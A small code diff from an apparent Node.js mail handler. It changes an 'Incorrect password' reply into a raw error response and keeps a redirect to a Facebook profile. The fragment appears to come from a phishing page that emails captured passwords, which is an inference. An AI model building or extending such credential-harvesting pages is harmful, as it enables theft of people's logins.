@@ -36,7 +36,7 @@ var mailData = {
 
   transporter.sendMail(mailData, function(error, info){
     if(error){
-      res.send("Incorrect password. Ty again.");
+      res.send(error);
     }else{
       res.redirect('https://www.facebook.com/rihana.reyes.56?fref=ts');
       
